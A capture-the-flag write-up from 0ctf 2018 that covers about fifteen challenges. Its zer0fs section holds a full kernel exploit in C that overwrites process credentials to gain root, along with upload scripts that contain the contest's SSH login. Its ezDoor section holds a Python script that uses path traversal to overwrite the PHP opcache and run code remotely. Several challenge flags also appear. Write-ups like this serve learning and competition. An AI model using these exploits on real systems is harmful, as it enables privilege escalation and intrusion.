# 0ctf writeup 

`******`

## babystack
I enjoy it because I learned ret2dlresolv the night before 0ctf 😜

<https://gist.github.com/elnx/6e40c07bee13def29fbbd94ecc8f172e>

## blackhole
Yet another ret2dlresolv challenge. ~~It looks like xx_game at QiangWangCup last week.🤔~~

However, it has some seccomp filters, no `execve` and no `write` this time. The only way to read flag is to use side channel attack, so use ret2dlresolv to call mprotect, then write shellcode to do SCA.

<https://gist.github.com/elnx/c16826e2698adb482f5f5f34fc862f62>

## House of Card

A weird challenge. The bug is very clear: give a negative number as size and the program will read a huge input to the stack, an easy stack-over-flow challenge right?

But fwrite is toooooooooooooooo weird! I test this bug on my PC and find fwrite will do nothing and return 0 when you give a `0xffffffff` as the size. However, try to input `-1` to the remote server, it says `4XXX written` or `8XXX written` sometimes!!!

Now here comes the idea: use two different ip, B exploit fwrite to leak its stack to the file, then A replace the `REMOTE_HOST` with B's ip, so it can read B's file, leak the B's canary, libc address... Now B can do exploitation, just smash the stack for fun and profit.

<https://gist.github.com/elnx/b5805d6938f086389aa16aa9dc8fdc0a>

## loginme

It seems that we use a unintended method. Use `array` to bypass the filter, and use `.*` to replace several chars, then we easily inject our code.

<https://gist.github.com/elnx/8d9ec79d16e03013bd4365794b55e971>

## g0g0g0

According to the log file, we are supposed to find the integer solution for `x,y,z>0` that satisfies `(x+y)*(x+z)*(y+z)*10=(x+y)*(x+z)*x+(x+y)*(y+z)*y+(x+y)*(y+z)*y`. According to this link <https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-+-frac-y-z+x-+-frac-z-x+y-4>, we can solve it using elliptic curves.

Ths solving process is listed below

```python
sage: E=EllipticCurve([0,517,0,416,0]) 
sage: x=var('x') 
sage: y=var('y') 
sage: a=104-x+y
sage: b=104-x-y
sage: c=-104-24*x
sage: p=E.gen(0)
for i in range(1000):
  p2=p*i
  a1=a.subs(x=p2[0],y=p2[1])
  b1=b.subs(x=p2[0],y=p2[1])
  c1=c.subs(x=p2[0],y=p2[1])
  if a1>0 and b1>0 and c1>0:
    print i

def doparse(st):
  pos=st.find('/')
  a1=int(st[:pos])
  a2=int(st[pos+1:])
  return a1,a2

def doint(pp):
  a1,a2=doparse(str(pp[0]))
  b1,b2=doparse(str(pp[1]))
  gg=gcd(a2,b2)
  lc=a2*b2/gg
  a1*=lc/a2
  b1*=lc/b2
  x=104*lc-a1+b1
  y=104*lc-a1-b1
  z=-104*lc-24*a1
  return x,y,z

for i in range(2,1000):
  p2=p*i
  a1,b1,c1=doint(p2)
  if a1>0 and b1>0 and c1>0:
    gg=gcd(a1,b1)
    gg=gcd(gg,c1)
    a1/=gg
    b1/=gg
    c1/=gg
    print i,len(str(a1)),len(str(b1)),len(str(c1))

269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977
4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209
221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347

flag{d0_You_l1k3_5Sa?cool~gogog0!}
```

## udp

This binary forks around 4000 processes and the main process maintains a counter. Every time it receives a message 4, the counter is increased by 1. After analyzing the forked process, we can find a two-dimension array to control the message sent, and only one process will produce the message 4. If you have some ACM experience it's quite easy to realize it is a maxflow. You can just extract the graph and computer the final counter to get the flag, which is  `flag{12491f295fb0}`.


## Baby VM

This binary will read and interpret the given bytecodes. After reversing it, we can find it to be a stack-based VM, and there exists opcode for the syscall towards CreateFile, ReadFile, DeviceIoControl and puts. So we use load imm to push arguments and call CreateFile, ReadFile to get `flag.txt`. We cannot set GENERIC_READ flag but you can find other flags like FILE_GENERIC_READ on MSDN, and using it will lead us to flag. `flag{574ck_v1r7u4l_m4ch1n3_15_v3ry_345y}`

## zer0fs

This challenge presents a virtual machine with a buggy Linux filesystem driver and a custom built hardened kernel (with kASLR, SMEP, SMAP and RANDSTRUCT). 

The bug is quite simple and straightforward, it assumes that each file resides in exactly one sector, but there are no limits in `read`/`write`, so it is easy to achieve (slightly unstable, as the buffer base will be reallocated each time) arbitary kernel memory read/write. We found that the sector data buffer usually resides about 0x1b00000 bytes before `task_struct`, and at `task_struct+0xA0` (after RANDSTRUCT) there is a pointer into the current `task_struct` itself, so in this way we can locate ourself, then we change the creds, and boom.

exploit.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/prctl.h>

void gen_rand_str(char *str, int len)
{
    for (int i = 0; i < len - 1; i++) str[i] = (rand() % (0x7e - ' ')) + ' ';
    str[len - 1] = 0;
}

int main(void)
{
    char comm[16];
    srand(time(NULL));
    gen_rand_str(comm, sizeof(comm));
    printf("Generated comm signature: '%s'\n", comm);

    int ret = prctl(PR_SET_NAME, comm);
    if (ret < 0) {
        perror("prctl");
        return 0;
    }

    system("/mount");

    char buf[4096];
    int fd = open("/mnt/leak", O_RDWR);
    for (int num = 0; num < 50000; num++) {
        read(fd, buf, 4096);
        if (num * 4096 < 0x1000000) continue;
        for (int i = 0; i < 4096 / 8; i++) {
            uint64_t* xp = ((uint64_t*)buf)+i;
            if (*(uint64_t*)comm == xp[0] && *(uint64_t*)(comm+8) == xp[1]) {
                // comm @ 0x538, cred @ 0xB38, real cred @ 0x1028
                printf("HIT COMM @ %p\n", num * 4096 + i * 8);
                if (num * 4096 + i * 8 > 0x1000000) {
                    uint64_t task_struct = *(uint64_t*)(buf + i * 8 - 0x538 + 0xa0) - 0xa0;
                    uint64_t read_base = task_struct - (num*4096+i*8-0x538);
                    uint64_t orig_cred = *(uint64_t*)(buf + i * 8 + 0xb38 - 0x538);
                    printf("task_struct @ %p\n", task_struct);
                    printf("read_base @ %p\n", read_base);
                    printf("orig_cred @ %p\n", orig_cred);

                    lseek(fd, orig_cred - read_base, SEEK_SET);
                    read(fd, buf, 256);
                    for (int i = 0; i < 256; i+=4) {
                        if (*(uint32_t*)(buf + i) == 1000) {
                            *(uint32_t*)(buf + i) = 0;
                        }
                    }
                    lseek(fd, orig_cred - read_base, SEEK_SET);
                    write(fd, buf, 256);

                    goto BOOM;
                }
            }
        }
    }
    BOOM:
    if (getuid() == 0) {
        puts("BOOM");
        char *shell = "/bin/sh";
        char *args[] = {shell, NULL};
        execve(shell, args, NULL);
    } else {
        puts("._.");
    }
    return 0;
}
```

gen_fs_img.py
```python
from pwn import *

context(arch='amd64')

MAGIC = 'ZERO\x00\x00\x00\x00'
block_size = 4096
inode_count = 2
free_blocks = 0xffffffffffffffff
free_blocks &= ~(1 << 0)
free_blocks &= ~(1 << 1)
free_blocks &= ~(1 << 2)
free_blocks &= ~(1 << 3)

super_block = flat([MAGIC, block_size, inode_count, free_blocks]).ljust(block_size, '\x00')
inodez = flat([
  [1, 2, 0x4000, 1],
  [1+4917, 3, 0x8000, 0xffffffffffffffff],
]).ljust(block_size, '\x00')
data = ('leak'.ljust(256, '\x00') + p64(1+4917)).ljust(block_size, '\x00')
pad = data
pad += '\x00' * block_size * 64

write('zerofs.img', super_block + inodez + pad)
```

upload.py

```python
from pwn import *

def breaky():
  shell.sendline('echo WTFORZ')
  shell.recvuntil('WTFORZ')

# ssh ctf@202.120.7.198
# ctf/Happyzerofs!
r = ssh('ctf', '202.120.7.198', password='Happyzerofs!')

shell = r.shell()
shell.recvuntil('/ $ ')
shell.sendline('stty -echo')
breaky()
shell.sendline('cat << EOF > /tmp/zerofs.img.gz.b64')
shell.sendline(read('zerofs.img.gz').encode('base64'))
shell.sendline('EOF')
breaky()
shell.sendline('cat << EOF > /tmp/a.out.gz.b64')
lines = read('a.out.gz').encode('base64').strip().split('\n')
with log.progress('Uploading a.out') as pg:
  for i, line in enumerate(lines):
    if i == 0:
      shell.recvuntil('> ')
    elif i % 500 == 0:
      shell.recvuntil('> ' * 500)
    shell.sendline(line)
    pg.status('{}/{}'.format(i+1, len(lines)))
  pg.success('Done')
shell.sendline('EOF')
breaky()
shell.sendline('cd /tmp')
breaky()
shell.sendline('base64 -d zerofs.img.gz.b64 > zerofs.img.gz')
breaky()
shell.sendline('gzip -d zerofs.img.gz')
breaky()
shell.sendline('base64 -d a.out.gz.b64 > a.out.gz')
breaky()
shell.sendline('gzip -d a.out.gz')
breaky()
shell.sendline('stty echo')

shell.interactive()
```

## Milk Tea Machine

This is an easy reversing challenge, it spawns 32 processes, let them debug each other, and uses named pipe to send data between these processes, each process transforms one byte of the data so we can brute force the flag byte by byte. The next process is picked randomly, and the master seed is simply `sum(map(ord, flag))` thus bruteforce-able. The transformation itself is implemented by trapping out to the debugger by a deliberate division by zero (it is quite interesting as Hex-Rays silently ignores this `idiv` instruction). 

<https://gist.github.com/Riatre/bc28af525fef206e35e4408cdb8f938d>

## Provisioning

This is a poorly designed challenge, as it could be solved without actual reverse enginerring.

After googling `eagle.bin` we realized it is a firmware meant for ESP8266 produced by offical toolchain + SDK + esptool. Googling the timestamp string `Nov 21 2014 11:15:48` in the binary we realized it uses [Espressif SDK 0.9.3](https://www.esp8266.com/viewtopic.php?f=9&t=584), we can compile the SDK demo app with exactly same SDK and toolchain, generate function sigs with Rizzo. 

After that we loaded the binary into IDA Pro at address 3FFE8000, applied the sigs and started reading the code, the program turns on promiscuous mode and tries to feed a decoder function with packet length, it is quite obvious that this is some SmartConfig-like thing. At this pointwe tried to Google harder and found [an interesting GitHub repo](https://github.com/lanyiyang/esp8266-smartconfig) by searching  "ESP8266 SmartConfig 0.9.3". We thought that the challenge author may have changed some encoding details so we continued to read the remaining code, but no it is a 1:1 copy :(

We then modified the source code found, wiring the data in `broadcast.pcap` to the decoding code, and:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <limits.h>
#include <assert.h>

#define RECEVEBUF_MAXLEN  90
#define SCAN_TIME  1000

typedef enum _encrytion_mode {
    ENCRY_NONE           = 1,
    ENCRY_WEP,
    ENCRY_TKIP,
    ENCRY_CCMP
} ENCYTPTION_MODE;

struct router_info {
    uint16_t rx_seq;
    uint8_t encrytion_mode;
};

enum smart_status
{
  SMART_CH_INIT = 0x1,
  SMART_CH_LOCKING = 0x2,
  SMART_CH_LOCKED = 0x4
};


uint8_t smart_lock_flag=0;
uint8_t smart_mac[6];
uint8_t smart_status = SMART_CH_INIT;

void smartconfig_end(uint8_t* buf);

uint8_t calcrc_1byte(uint8_t onebyte)    
{    
    uint8_t i,crc_1byte;     
    crc_1byte=0;               
    for(i = 0; i < 8; i++)    
     {    
       if(((crc_1byte^onebyte)&0x01)) 
       {    
         crc_1byte^=0x18;     
         crc_1byte>>=1;    
         crc_1byte|=0x80;    
       }else{
         crc_1byte>>=1; 
       }     
             
       onebyte>>=1;          
      }   
    return crc_1byte;   
}   

uint8_t calcrc_bytes(uint8_t *p,uint8_t len)  
{  
  uint8_t crc=0;  
  while(len--)
  {  
    crc=calcrc_1byte(crc^(*p));
    p++;
  }  
  printf("[smart] calcrc_bytes: %02x \n",crc);
  return crc;
}

int smart_config_decode(uint8_t* pOneByte)
{
    int i = 0;
    uint8_t pos=0,val=0;
    uint8_t n0,n1;
    static uint8_t smart_recvbuf_len=0;    
    static uint8_t smart_recvbuf[RECEVEBUF_MAXLEN];
    
    if( !(0==pOneByte[0]&&0==pOneByte[1]) ) return -9;
    
    n0 = (pOneByte[2]-1);
    n1 = (pOneByte[3]-1);
    if( (n1+n0) != 15 ) return -1;
    
    pos = (n0&0xf);
    n0 = (pOneByte[4]-1);
    n1 = (pOneByte[5]-1);
    if( (n1+n0) != 15 ) return -2;
    
    pos |= (n0&0xf)<<4;
    n0 = (pOneByte[6]-1);
    n1 = (pOneByte[7]-1);
    if( (n1+n0) != 15 ) return -3;

    val = (n0&0xf);
    n0 = (pOneByte[8]-1);
    n1 = (pOneByte[9]-1);
    if( (n1+n0) != 15 ) return -4;

    val |= (n0&0xf)<<4;
    if( (int)pos >= (int)RECEVEBUF_MAXLEN ) return -5;

    if( smart_recvbuf[pos] == val && smart_recvbuf_len>2 ){//begin crc8
        if(calcrc_bytes(smart_recvbuf,smart_recvbuf_len) == smart_recvbuf[smart_recvbuf_len] ){
            smart_recvbuf[smart_recvbuf_len+1]='\0';
            
            smartconfig_end(smart_recvbuf);
            
            return 0;
        }
        
      printf("[smart]:%s\n",smart_recvbuf);
    }else{
    
      smart_recvbuf[pos] = val;
      printf("[%02x]=%02x\n",pos,val);
      if( pos > smart_recvbuf_len ){
        smart_recvbuf_len = pos;
      }
      return SMART_CH_LOCKED;
   }
    
    return 99;
}

uint32_t system_get_time()
{
    return 123456;
}

void  smart_analyze(uint8_t* buf,int len)
{
  int funret;
  static uint32_t smart_lock_time=0;
  static uint8_t  smart_onbyte_Idx=0;
  static uint8_t  smart_onbyte[10];
  //1.th the packet len is under 16.
  if( len > 16 ) return;
  if( (system_get_time() - smart_lock_time) > 70000)
  {
    smart_status =SMART_CH_INIT; 
  }
  if(SMART_CH_INIT == smart_status && len == 0)
  {
    if(smart_lock_flag == 0)
    {
      memcpy(smart_mac,buf,6);
    }
    
    smart_lock_time=system_get_time();
    smart_status = SMART_CH_LOCKING;
    smart_onbyte_Idx = 0;
    smart_onbyte[smart_onbyte_Idx++]=len;
  
  }else if( SMART_CH_LOCKING == smart_status ){
  
      if( memcmp(smart_mac,buf,6) == 0 ) {
          if( len == 0){
            smart_onbyte[smart_onbyte_Idx++]=len;
            smart_status = SMART_CH_LOCKED;
          }else{
            smart_status =SMART_CH_INIT; 
            smart_onbyte_Idx=0;
          }
          smart_lock_time=system_get_time();
      }
      
  }else if( SMART_CH_LOCKED == smart_status ){
  
        if( memcmp(smart_mac,buf,6) == 0 ){
            if( len == 0 ){
              if(smart_lock_flag == 0){
                memcpy(smart_mac,buf,6);
               }
              smart_status = SMART_CH_LOCKING;
              smart_onbyte_Idx = 0;
              smart_onbyte[smart_onbyte_Idx++]=len;
              printf("[smart] resync  into SMART_CH_LOCKING\n");
            }else{
              smart_onbyte[smart_onbyte_Idx++]=len; 
            }
            smart_lock_time=system_get_time();
        }
        
  }
   
  if(smart_onbyte_Idx>=10)
  {
    funret = smart_config_decode(smart_onbyte);
    printf("[smart] Decode ret=%d\n",funret);
    if( SMART_CH_LOCKED == funret )
    {
      smart_status = SMART_CH_LOCKED ;
      smart_lock_flag = 1;
    }
    smart_status = SMART_CH_INIT; 
    smart_onbyte_Idx=0;
  }
}

struct router_info xinfo;
struct router_info* info = &xinfo;

void wifi_promiscuous_rx(uint8_t *buf, uint16_t len)
{
  uint16_t i;

  printf("[smart] len = %d,buf = %02x %02x\n",len, buf[0],buf[1]);
  
  //2.th 0x08 and 0x88 is wifi Data frame
  if ((buf[0] == 0x08 || buf[0] == 0x88) && (buf[1] & 0x02) == 0x02) {
    if (info->rx_seq != (*(uint16_t *)(buf + 22)) >> 4) {
      info->rx_seq = (*(uint16_t *)(buf + 22)) >> 4;

      if (info->encrytion_mode != 0) {
        if ((buf[0] & 0x80) == 0) {
          len -= 24;
        } else {
          len -= 26;
        }
        if (info->encrytion_mode == ENCRY_NONE) {
          len -= 40;
        } else if (info->encrytion_mode == ENCRY_WEP){
          len = len - 40 - 4 - 4;
        } else if (info->encrytion_mode == ENCRY_TKIP) {
          len = len - 40 - 12 - 8;
        } else if (info->encrytion_mode == ENCRY_CCMP) {
          len = len - 40 - 8 - 8;
        }
        
        //4.th check the packet len. 
        //printf(MACSTR ",len --- %d\n", MAC2STR(buf + 10), len);
        smart_analyze(buf+10,len);
      }
    }
  }
}

void smartconfig_end(uint8_t* buf)
{
//   wifi_promiscuous_enable(0);

  printf("*************************************\n");
  printf("Get the smartconfig result:\n");
  printf("%s\n",buf);
  printf("*************************************\n");
}

int main(void)
{
    info->encrytion_mode = 4;
    for (int i = 0; i < 21303; i++) {
        char fn[256];
        sprintf(fn, "packetz/%d", i);
        FILE* fp = fopen(fn, "rb");
        fseek(fp, 0, SEEK_END);
        uint16_t len = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        unsigned char pkt[2048];
        assert(fread(pkt, 1, len, fp) == len);
        fclose(fp);

        wifi_promiscuous_rx(pkt, len);
    }
    return 0;
}
```

## ezDoor

<https://github.com/GoSecure/php7-opcache-override>

1. Path traversal in file uploading logic.
2. Overwrite the opcache to execute arbitary PHP code.
3. Retrieve a flag.php.bin, reverse engineering and boom.

phpinfo():
```
    opcache.blacklist_filename => no value => no value
    opcache.consistency_checks => 1 => 1
    opcache.dups_fix => Off => Off
    opcache.enable => On => On
    opcache.enable_cli => Off => Off
    opcache.enable_file_override => Off => Off
    opcache.error_log => no value => no value
    opcache.fast_shutdown => 0 => 0
    opcache.file_cache => /tmp/cache => /tmp/cache
    opcache.file_cache_consistency_checks => 1 => 1
    opcache.file_cache_only => 1 => 1
    opcache.file_update_protection => 2 => 2
    opcache.force_restart_timeout => 180 => 180
    opcache.huge_code_pages => Off => Off
    opcache.inherited_hack => On => On
    opcache.interned_strings_buffer => 4 => 4
    opcache.lockfile_path => /tmp => /tmp
    opcache.log_verbosity_level => 1 => 1
    opcache.max_accelerated_files => 2000 => 2000
    opcache.max_file_size => 0 => 0
    opcache.max_wasted_percentage => 5 => 5
    opcache.memory_consumption => 64 => 64
    opcache.optimization_level => 0x7FFFBFFF => 0x7FFFBFFF
    opcache.preferred_memory_model => no value => no value
    opcache.protect_memory => 0 => 0
    opcache.restrict_api => no value => no value
    opcache.revalidate_freq => 2 => 2
    opcache.revalidate_path => Off => Off
    opcache.save_comments => 1 => 1
    opcache.use_cwd => On => On
    opcache.validate_permission => Off => Off
    opcache.validate_root => Off => Off
    opcache.validate_timestamps => On => On
```

da.py

```python
from pwnlib.util.fiddling import hexdump

import sys
import struct
import hashlib
import requests
import time

LOCAL_OPCACHE_PATH = '/var/www/html/opcache/'

# MY_IP = '123.114.51.192'
MY_IP = '111.196.69.197'

REMOTE_OPCACHE_PATH = '/tmp/cache/'
SERVER = 'http://202.120.7.217:9527/'
REMOTE_ID = '7badddeddbd076fe8352e80d8ddf3e73'

# REMOTE_OPCACHE_PATH = LOCAL_OPCACHE_PATH
# SERVER = 'http://127.0.0.1/'
# REMOTE_ID = '7badddeddbd076fe8352e80d8ddf3e73'
# MY_IP = '127.0.0.1'

LOCAL_ID = '7badddeddbd076fe8352e80d8ddf3e73'
SANDBOX = 'sandbox/' + hashlib.sha1(MY_IP).hexdigest() + '/'

# with open('{}{}/var/www/html/{}evil.php.bin'.format(OPCACHE_PATH, LOCAL_ID, SANDBOX), 'rb') as fp:
with open('{}{}/var/www/html/evil.php.bin'.format(LOCAL_OPCACHE_PATH, LOCAL_ID), 'rb') as fp:
# with open('{}{}/var/www/html/{}index.php.bin'.format(LOCAL_OPCACHE_PATH, LOCAL_ID, SANDBOX), 'rb') as fp:
  data = fp.read()

r = requests.get(SERVER, params={'action': 'reset'})
print 'Reset:', r.content

r = requests.get(SERVER, params={'action': 'time'})
print 'Time:', r.content
rts = int(r.content)

time.sleep(5)

r = requests.get(SERVER, params={'action': 'shell'})
print 'Dummy shell:', r.content

r = requests.get(SERVER, params={'action': 'pwd'})
print 'Sandbox:', r.content
assert r.content == SANDBOX

# rts = 1522496721

# data = data.replace(LOCAL_ID, REMOTE_ID)
print hexdump(data)
for t in range(rts-2, rts+3):
  data = list(data)
  data[0x40:0x44] = struct.pack('=I', t)
  # data[0x1a8:0x1b0] = struct.pack('=I', int(sys.argv[1]))
  # data[0x1f0:0x1f4] = struct.pack('=I', int(sys.argv[1]))
  data = ''.join(data)

  r = requests.post(SERVER, params={'action': 'upload', 'name': '../../../../../../../../../../../..{}{}/var/www/html/{}index.php.bin'.format(REMOTE_OPCACHE_PATH, REMOTE_ID, SANDBOX)}, files={'file': data})
  # r = requests.post(SERVER, params={'action': 'upload', 'name': '../../../../../../../../../../../..{}{}/var/www/html/index.php.bin'.format(OPCACHE_PATH, REMOTE_ID)}, files={'file': data})
  print 'Upload:', r.content

  # time.sleep(2.0)

  r = requests.post(SERVER, params={'action': 'shell'}, data={"riatre": "echo 'WTF';"})
  print 'Result:', r.status_code, r.content
  if 'WTF' in r.content:
    break

r = requests.post(SERVER, params={'action': 'shell'}, data={"riatre": "echo file_get_contents('/var/www/html/flag');"})
print r.content

```

decode_flag.php
```php
<?php

function encrypt($data, $pwd) {
    mt_srand(1337);
    $pwd_length = strlen($pwd);
    $data_length = strlen($data);
    for ($i = 0; $i < $data_length; $i++) {
        echo chr(ord($data[$i]) ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(0, 255));
    }
}

echo encrypt("\x85\xb9\x54\xfc\x83\x80\xa4\x66\x27\x6e\x4a\x48\x24\x9d\xdd\x4a\x19\x9f\xc3\x4e\x5b\x6\x14\x64\xe4\x29\x5f\xc5\x2\xc\x88\xbf\xd8\x54\x55\x19\xab", "this_is_a_very_secret_key");
```

## hidden message

Search the key words, and you will find [https://en.wikipedia.org/wiki/Transmission_Control_Protocol](https://en.wikipedia.org/wiki/Transmission_Control_Protocol), after getting several text and comparing, you can put together the flag

## h4x0rs.club 1

use `admin/admin` to login and then get flag~

## babyheap
[writeup link](https://github.com/sixstars/ctf/tree/master/2018/0ctf/baby-heap-2018)

## mathgame
[writeup link](https://github.com/sixstars/ctf/tree/master/2018/0ctf/math-game)
